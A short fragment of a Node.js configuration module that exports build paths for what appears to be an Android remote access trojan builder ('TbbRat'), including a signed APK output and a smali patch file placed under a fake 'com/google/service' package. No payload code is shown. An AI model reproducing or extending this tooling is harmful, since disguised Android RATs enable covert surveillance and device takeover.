...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/TBB_BLANK.apk.apk')

exports.termuxApkBuildPath = exports.termux + '/TbbRat/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/TbbRat/TBB_BLANK.apk'
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali_classes3/com/google/service/IOSocket.smali');
